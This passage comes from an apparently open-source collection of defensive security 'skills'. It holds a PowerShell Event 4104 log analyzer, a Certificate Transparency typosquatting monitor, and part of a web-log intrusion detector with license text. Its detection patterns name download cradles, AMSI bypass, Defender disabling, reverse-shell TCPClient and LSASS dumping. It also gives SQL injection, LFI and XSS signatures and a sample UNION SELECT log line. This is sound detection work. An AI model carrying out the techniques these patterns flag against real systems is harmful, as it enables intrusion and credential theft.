| High entropy (>5.5) | T1027 | Medium |

===== END FILE =====


===== FILE: skills/analyzing-powershell-script-block-logging/scripts/agent.py =====
#!/usr/bin/env python3
"""PowerShell Script Block Logging Analyzer - Parses Event 4104 from EVTX for obfuscated commands."""

import json
import math
import re
import base64
import logging
import argparse
from collections import defaultdict
from datetime import datetime

from Evtx.Evtx import FileHeader
from lxml import etree

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

NS = {"evt": "http://schemas.microsoft.com/win/2004/08/events/event"}

SUSPICIOUS_PATTERNS = [
    (r"(?i)\-[Ee]ncoded[Cc]ommand", "Encoded command parameter", "T1059.001", "high"),
    (r"(?i)FromBase64String", "Base64 decoding", "T1140", "high"),
    (r"(?i)(Invoke-Expression|iex)\s*\(", "Invoke-Expression execution", "T1059.001", "high"),
    (r"(?i)(DownloadString|DownloadFile|Invoke-WebRequest|wget|curl)", "Download cradle", "T1105", "critical"),
    (r"(?i)(Net\.WebClient|WebRequest\.Create)", "Network client instantiation", "T1071.001", "high"),
    (r"(?i)(AmsiUtils|amsiInitFailed|AmsiScanBuffer)", "AMSI bypass attempt", "T1562.001", "critical"),
    (r"(?i)(Invoke-Mimikatz|Invoke-Kerberoast|Invoke-TokenManipulation)", "Offensive PowerShell tool", "T1003", "critical"),
    (r"(?i)(Add-MpPreference\s*-ExclusionPath)", "Defender exclusion", "T1562.001", "high"),
    (r"(?i)(Set-MpPreference\s*-DisableRealtimeMonitoring)", "Defender disable", "T1562.001", "critical"),
    (r"(?i)(New-Object\s+System\.Net\.Sockets\.TCPClient)", "Reverse shell pattern", "T1059.001", "critical"),
    (r"(?i)(Get-Process\s+lsass|MiniDump)", "LSASS dump attempt", "T1003.001", "critical"),
    (r"(?i)(ConvertTo-SecureString|PSCredential)", "Credential handling", "T1078", "medium"),
]


def calculate_entropy(text):
    """Calculate Shannon entropy of a string to detect obfuscation."""
    if not text:
        return 0.0
    freq = defaultdict(int)
    for char in text:
        freq[char] += 1
    length = len(text)
    return -sum((count / length) * math.log2(count / length) for count in freq.values())


def parse_evtx_4104(evtx_path):
    """Parse Event ID 4104 entries from a PowerShell Operational EVTX file."""
    script_blocks = defaultdict(dict)
    with open(evtx_path, "rb") as f:
        fh = FileHeader(f)
        for record in fh.records():
            try:
                xml = record.xml()
                root = etree.fromstring(xml.encode("utf-8"))
                event_id_elem = root.find(".//evt:System/evt:EventID", NS)
                if event_id_elem is None or event_id_elem.text != "4104":
                    continue
                event_data = {}
                for data_elem in root.findall(".//evt:EventData/evt:Data", NS):
                    name = data_elem.get("Name", "")
                    event_data[name] = data_elem.text or ""
                script_block_id = event_data.get("ScriptBlockId", "")
                message_number = int(event_data.get("MessageNumber", "1"))
                message_total = int(event_data.get("MessageTotal", "1"))
                script_text = event_data.get("ScriptBlockText", "")
                time_elem = root.find(".//evt:System/evt:TimeCreated", NS)
                timestamp = time_elem.get("SystemTime", "") if time_elem is not None else ""
                if script_block_id not in script_blocks:
                    script_blocks[script_block_id] = {
                        "parts": {},
                        "total": message_total,
                        "timestamp": timestamp,
                        "path": event_data.get("Path", ""),
                    }
                script_blocks[script_block_id]["parts"][message_number] = script_text
            except Exception:
                continue
    logger.info("Parsed %d unique script blocks from %s", len(script_blocks), evtx_path)
    return script_blocks


def reconstruct_scripts(script_blocks):
    """Reconstruct full scripts from multi-part script block entries."""
    reconstructed = []
    for block_id, block_data in script_blocks.items():
        parts = block_data["parts"]
        total = block_data["total"]
        ordered = [parts.get(i, "") for i in range(1, total + 1)]
        full_script = "".join(ordered)
        reconstructed.append({
            "script_block_id": block_id,
            "timestamp": block_data["timestamp"],
            "path": block_data["path"],
            "part_count": total,
            "script_text": full_script,
            "length": len(full_script),
        })
    logger.info("Reconstructed %d complete scripts", len(reconstructed))
    return reconstructed


def decode_base64_commands(script_text):
    """Attempt to decode Base64-encoded command strings found in scripts."""
    decoded_commands = []
    b64_pattern = re.compile(r"[A-Za-z0-9+/=]{40,}")
    for match in b64_pattern.finditer(script_text):
        try:
            decoded = base64.b64decode(match.group()).decode("utf-16-le", errors="ignore")
            if any(c.isalpha() for c in decoded[:20]):
                decoded_commands.append({"encoded": match.group()[:60], "decoded": decoded[:500]})
        except Exception:
            continue
    return decoded_commands


def analyze_script(script_entry):
    """Analyze a single reconstructed script for suspicious patterns."""
    text = script_entry["script_text"]
    findings = []
    for pattern, description, mitre, severity in SUSPICIOUS_PATTERNS:
        matches = re.findall(pattern, text)
        if matches:
            findings.append({
                "pattern": description,
                "mitre_technique": mitre,
                "severity": severity,
                "match_count": len(matches),
                "sample": matches[0][:100] if matches else "",
            })
    entropy = calculate_entropy(text)
    if entropy > 5.5 and len(text) > 200:
        findings.append({
            "pattern": "High entropy (possible obfuscation)",
            "mitre_technique": "T1027",
            "severity": "medium",
            "entropy": round(entropy, 2),
        })
    decoded = decode_base64_commands(text)
    if decoded:
        findings.append({
            "pattern": "Base64-encoded content decoded",
            "mitre_technique": "T1140",
            "severity": "high",
            "decoded_count": len(decoded),
            "samples": decoded[:3],
        })
    return findings


def generate_report(scripts, all_findings):
    """Generate PowerShell script block analysis report."""
    critical = sum(1 for f in all_findings if any(ff["severity"] == "critical" for ff in f["findings"]))
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "total_scripts": len(scripts),
        "suspicious_scripts": len([f for f in all_findings if f["findings"]]),
        "critical_scripts": critical,
        "findings": all_findings[:50],
    }
    print(f"PS SCRIPT BLOCK REPORT: {len(scripts)} scripts, {critical} critical")
    return report


def main():
    parser = argparse.ArgumentParser(description="PowerShell Script Block Logging Analyzer")
    parser.add_argument("--evtx-file", required=True, help="Path to PowerShell Operational EVTX")
    parser.add_argument("--output", default="ps_analysis.json")
    args = parser.parse_args()

    blocks = parse_evtx_4104(args.evtx_file)
    scripts = reconstruct_scripts(blocks)

    all_findings = []
    for script in scripts:
        findings = analyze_script(script)
        if findings:
            all_findings.append({
                "script_block_id": script["script_block_id"],
                "timestamp": script["timestamp"],
                "path": script["path"],
                "length": script["length"],
                "findings": findings,
                "script_preview": script["script_text"][:300],
            })

    report = generate_report(scripts, all_findings)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/analyzing-tls-certificate-transparency-logs/SKILL.md =====
---
name: analyzing-tls-certificate-transparency-logs
description: 'Queries Certificate Transparency logs via crt.sh and pycrtsh to detect
  phishing domains, unauthorized certificate issuance, and shadow IT. Monitors newly
  issued certificates for typosquatting and brand impersonation using Levenshtein
  distance. Use for proactive phishing domain detection and certificate monitoring.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- certificate-transparency
- ct-logs
- crt-sh
- phishing-detection
- tls-monitoring
- security-operations
version: '1.0'
author: mahipal
license: Apache-2.0
atlas_techniques:
- AML.T0073
- AML.T0052
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1583.001
- T1566.002
- T1598.003
- T1583.006
mitre_f3:
  version: '1.1'
  tactics:
  - reconnaissance
  - resource-development
  - initial-access
  techniques:
  - id: T1598
    name: Phishing for Information
    tactic: reconnaissance
    source: attack
  - id: T1593
    name: Search Open Websites/Domains
    tactic: reconnaissance
    source: attack
  - id: T1583.001
    name: 'Acquire Infrastructure: Domains'
    tactic: resource-development
    source: attack
  - id: F1020.002
    name: 'Create Fake Materials: Fake Website'
    tactic: resource-development
    source: f3
  - id: T1660
    name: Phishing
    tactic: initial-access
    source: attack
---

# Analyzing TLS Certificate Transparency Logs


## When to Use

- When investigating security incidents that require analyzing tls certificate transparency logs
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Query crt.sh Certificate Transparency database to find certificates issued for
domains similar to your organization's brand, detecting phishing infrastructure.

```python
from pycrtsh import Crtsh

c = Crtsh()
# Search for certificates matching a domain
certs = c.search("example.com")
for cert in certs:
    print(cert["id"], cert["name_value"])

# Get full certificate details
details = c.get(certs[0]["id"], type="id")
```

Key analysis steps:
1. Query crt.sh for all certificates matching your domain pattern
2. Identify certificates with typosquatting variations (Levenshtein distance)
3. Flag certificates from unexpected CAs
4. Monitor for wildcard certificates on suspicious subdomains
5. Cross-reference with known phishing infrastructure

## Examples

```python
from pycrtsh import Crtsh
c = Crtsh()
certs = c.search("%.example.com")
for cert in certs:
    print(f"Issuer: {cert.get('issuer_name')}, Domain: {cert.get('name_value')}")
```

===== END FILE =====


===== FILE: skills/analyzing-tls-certificate-transparency-logs/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/analyzing-tls-certificate-transparency-logs/references/api-reference.md =====
# API Reference: Analyzing TLS Certificate Transparency Logs

## pycrtsh

```python
from pycrtsh import Crtsh
c = Crtsh()

# Search certificates by domain
certs = c.search("example.com")      # exact match
certs = c.search("%.example.com")    # wildcard subdomains

# Get certificate details by ID
details = c.get(cert_id, type="id")
details = c.get(sha1_hash, type="sha1")
details = c.get(sha256_hash, type="sha256")
```

## crt.sh REST API (Direct)

```python
import requests

# JSON output
resp = requests.get("https://crt.sh/?q=%.example.com&output=json")
records = resp.json()
# Fields: id, issuer_ca_id, issuer_name, common_name,
#          name_value, not_before, not_after, serial_number
```

## certstream (Real-Time CT Monitoring)

```python
import certstream

def callback(message, context):
    if message["message_type"] == "certificate_update":
        all_domains = message["data"]["leaf_cert"]["all_domains"]
        print(all_domains)

certstream.listen_for_events(callback, url="wss://certstream.calidog.io/")
```

## Key Certificate Fields

| Field | Description |
|-------|-------------|
| `common_name` | Primary domain on certificate |
| `name_value` | SAN (Subject Alternative Names) |
| `issuer_name` | Certificate Authority |
| `not_before` | Issuance date |
| `not_after` | Expiration date |

### References

- pycrtsh: https://pypi.org/project/pycrtsh/
- crt.sh: https://crt.sh/
- certstream: https://certstream.calidog.io/
- CT RFC 6962: https://datatracker.ietf.org/doc/html/rfc6962

===== END FILE =====


===== FILE: skills/analyzing-tls-certificate-transparency-logs/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for analyzing Certificate Transparency logs for phishing detection."""

import json
import argparse
from datetime import datetime

import requests
from pycrtsh import Crtsh


def search_certificates(domain, include_expired=False):
    """Search crt.sh for certificates matching a domain."""
    c = Crtsh()
    certs = c.search(domain)
    if not include_expired:
        now = datetime.utcnow()
        certs = [cert for cert in certs if cert.get("not_after")
                 and datetime.strptime(str(cert["not_after"]), "%Y-%m-%dT%H:%M:%S") > now]
    return certs


def get_certificate_details(cert_id):
    """Get full certificate details from crt.sh by ID."""
    c = Crtsh()
    return c.get(cert_id, type="id")


def search_crtsh_api(domain):
    """Query crt.sh REST API directly for certificate records."""
    url = f"https://crt.sh/?q={domain}&output=json"
    resp = requests.get(url, timeout=30)
    resp.raise_for_status()
    return resp.json()


def levenshtein_distance(s1, s2):
    """Compute Levenshtein distance between two strings."""
    if len(s1) < len(s2):
        return levenshtein_distance(s2, s1)
    if len(s2) == 0:
        return len(s1)
    prev_row = range(len(s2) + 1)
    for i, c1 in enumerate(s1):
        curr_row = [i + 1]
        for j, c2 in enumerate(s2):
            insertions = prev_row[j + 1] + 1
            deletions = curr_row[j] + 1
            substitutions = prev_row[j] + (c1 != c2)
            curr_row.append(min(insertions, deletions, substitutions))
        prev_row = curr_row
    return prev_row[-1]


def detect_typosquatting(target_domain, ct_records, max_distance=3):
    """Detect typosquatting domains using Levenshtein distance."""
    base = target_domain.split(".")[0]
    suspicious = []
    seen = set()
    for record in ct_records:
        domain = record.get("common_name", "") or record.get("name_value", "")
        if not domain or domain in seen:
            continue
        seen.add(domain)
        candidate_base = domain.split(".")[0].lstrip("*").lstrip(".")
        if candidate_base == base:
            continue
        dist = levenshtein_distance(base, candidate_base)
        if 0 < dist <= max_distance:
            suspicious.append({
                "domain": domain,
                "distance": dist,
                "issuer": record.get("issuer_name", ""),
                "not_before": record.get("not_before", ""),
                "not_after": record.get("not_after", ""),
            })
    return sorted(suspicious, key=lambda x: x["distance"])


def detect_unauthorized_cas(ct_records, allowed_cas):
    """Find certificates issued by unauthorized Certificate Authorities."""
    unauthorized = []
    for record in ct_records:
        issuer = record.get("issuer_name", "")
        if issuer and not any(ca.lower() in issuer.lower() for ca in allowed_cas):
            unauthorized.append({
                "domain": record.get("common_name", ""),
                "issuer": issuer,
                "not_before": record.get("not_before", ""),
                "cert_id": record.get("id"),
            })
    return unauthorized


def monitor_new_certificates(domain, hours_back=24):
    """Find certificates issued in the last N hours."""
    records = search_crtsh_api(f"%.{domain}")
    cutoff = datetime.utcnow().timestamp() - (hours_back * 3600)
    recent = []
    for r in records:
        not_before = r.get("not_before", "")
        if not_before:
            try:
                cert_time = datetime.strptime(not_before, "%Y-%m-%dT%H:%M:%S")
                if cert_time.timestamp() > cutoff:
                    recent.append({
                        "domain": r.get("common_name", ""),
                        "issuer": r.get("issuer_name", ""),
                        "not_before": not_before,
                        "name_value": r.get("name_value", ""),
                    })
            except ValueError:
                continue
    return recent


def find_wildcard_certificates(ct_records):
    """Identify wildcard certificates that could cover many subdomains."""
    wildcards = []
    for r in ct_records:
        name = r.get("common_name", "") or r.get("name_value", "")
        if name.startswith("*."):
            wildcards.append({
                "domain": name,
                "issuer": r.get("issuer_name", ""),
                "not_before": r.get("not_before", ""),
                "not_after": r.get("not_after", ""),
            })
    return wildcards


def main():
    parser = argparse.ArgumentParser(description="Certificate Transparency Analysis Agent")
    parser.add_argument("--domain", required=True, help="Target domain to monitor")
    parser.add_argument("--allowed-cas", nargs="*", default=["Let's Encrypt", "DigiCert",
                        "Sectigo", "Amazon", "Google Trust Services"])
    parser.add_argument("--output", default="ct_report.json")
    parser.add_argument("--action", choices=[
        "search", "typosquat", "unauthorized_ca", "monitor", "full_scan"
    ], default="full_scan")
    args = parser.parse_args()

    report = {"domain": args.domain, "generated_at": datetime.utcnow().isoformat(),
              "findings": {}}

    ct_records = search_crtsh_api(f"%.{args.domain}")
    report["findings"]["total_certificates"] = len(ct_records)
    print(f"[+] Found {len(ct_records)} certificates for {args.domain}")

    if args.action in ("typosquat", "full_scan"):
        typos = detect_typosquatting(args.domain, ct_records)
        report["findings"]["typosquatting"] = typos
        print(f"[+] Typosquatting domains: {len(typos)}")

    if args.action in ("unauthorized_ca", "full_scan"):
        unauth = detect_unauthorized_cas(ct_records, args.allowed_cas)
        report["findings"]["unauthorized_cas"] = unauth[:50]
        print(f"[+] Unauthorized CA certs: {len(unauth)}")

    if args.action in ("monitor", "full_scan"):
        recent = monitor_new_certificates(args.domain)
        report["findings"]["recent_24h"] = recent
        print(f"[+] Certificates issued in last 24h: {len(recent)}")

    wildcards = find_wildcard_certificates(ct_records)
    report["findings"]["wildcard_certs"] = wildcards
    print(f"[+] Wildcard certificates: {len(wildcards)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/analyzing-web-server-logs-for-intrusion/SKILL.md =====
---
name: analyzing-web-server-logs-for-intrusion
description: Parse Apache and Nginx access logs to detect SQL injection attempts,
  local file inclusion, directory traversal, web scanner fingerprints, and brute-force
  patterns. Uses regex-based pattern matching against OWASP attack signatures, GeoIP
  enrichment for source attribution, and statistical anomaly detection for request
  frequency and response size outliers.
domain: cybersecurity
subdomain: security-operations
tags:
- web-log-analysis
- apache-logs
- nginx-logs
- sql-injection-detection
- lfi-detection
- directory-traversal
- intrusion-detection
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1190
- T1059.007
- T1110
- T1595.002
- T1505.003
---


# Analyzing Web Server Logs for Intrusion


## When to Use

- When investigating security incidents that require analyzing web server logs for intrusion
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

1. Install dependencies: `pip install geoip2 user-agents`
2. Collect web server access logs in Combined Log Format (Apache) or Nginx default format.
3. Parse each log entry extracting: IP, timestamp, method, URI, status code, response size, user-agent, referer.
4. Apply detection rules:
   - SQL injection: `UNION SELECT`, `OR 1=1`, `' OR '`, hex encoding patterns
   - LFI/Path traversal: `../`, `/etc/passwd`, `/proc/self`, `php://filter`
   - XSS: `<script>`, `javascript:`, `onerror=`, `onload=`
   - Scanner signatures: nikto, sqlmap, dirbuster, gobuster, wfuzz user-agents
   - Brute force: >50 POST requests to login endpoints from same IP in 5 minutes
5. Enrich with GeoIP data and generate a prioritized findings report.

```bash
python scripts/agent.py --log-file /var/log/nginx/access.log --geoip-db GeoLite2-City.mmdb --output web_intrusion_report.json
```

## Examples

### Detect SQLi in URI
```
192.168.1.100 - - [15/Jan/2024:10:30:45 +0000] "GET /products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 200 4532
```

### Scanner User-Agent Detection
```
Nikto/2.1.6, sqlmap/1.7, DirBuster-1.0-RC1, gobuster/3.1.0
```

===== END FILE =====


===== FILE: skills/analyzing-web-server-logs-for-intrusion/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
